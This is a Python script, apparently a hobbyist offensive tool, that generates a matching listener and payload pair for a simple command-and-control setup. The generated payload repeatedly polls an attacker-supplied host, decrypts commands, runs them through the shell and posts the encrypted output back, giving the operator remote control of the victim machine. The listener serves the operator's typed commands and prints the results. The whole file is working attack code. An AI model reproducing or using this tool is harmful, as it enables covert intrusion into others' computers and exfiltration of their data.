import pyfiglet
import time
import random
import string

ascii_banner = pyfiglet.figlet_format("CODENAME C2: Generator")
print(ascii_banner)

filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 3))

LHOST = str(input(">>> LHOST: "))
print()
LPORT = int(input(">>> LPORT: "))
print()
Domain = f"http://{LHOST}:{LPORT}"
print(f">>> Domain: {Domain}")
print()
Key = str(input(">>> Create Password to Encrypt & Decrypt signals: "))
print()
print(">>> Generating ...")
time.sleep(2)


Listener = f'''
from http.server import BaseHTTPRequestHandler, HTTPServer
import os, cryptocode
import pyfiglet

ascii_banner = pyfiglet.figlet_format("CODENAME C2: Listener")
print(ascii_banner)

LHOST = "{LHOST}"
LPORT = {LPORT}

class Server_Filter(BaseHTTPRequestHandler):
    
    def do_GET(self):
        CMD = str(input('>>> '))
        encoded = cryptocode.encrypt(CMD,"{Key}")
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(encoded.encode())
    
    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        Post_Data = self.rfile.read(int(self.headers['Content-Length']))
        Raw_Data = Post_Data.decode()
        Data = cryptocode.decrypt(Raw_Data,"{Key}")
        print(Data)

if __name__ == '__main__':
    Server_Characteristic = HTTPServer((LHOST, LPORT), Server_Filter)
    try:
        Server_Characteristic.serve_forever()
    except KeyboardInterrupt:
        print('[-] Server Closed')

'''

Payload = f'''
import requests, subprocess, cryptocode

while True:
  try:
    get_raw_cmd = requests.get('{Domain}')
    raw_cmd = get_raw_cmd.text
    cmd = cryptocode.decrypt(raw_cmd,"{Key}")
    if 'Closed' in cmd:
        break
    else:
        output = subprocess.check_output(cmd, shell = True)
        Data = output.decode('utf-8')
        encoded = cryptocode.encrypt(Data,"{Key}")
        post_output = requests.post(url = '{Domain}', data = encoded)
  except Exception:
    cmd = "Error"          
'''

with open(f"Listener_{filename}.py","a") as file:
        file.write(Listener)
        
print()
print(f">>> 'Listener_{filename}.py' is generated")

with open(f"Payload_{filename}.py","a") as file:
        file.write(Payload)
        
print()
print(f">>> 'Payload_{filename}.py' is generated")
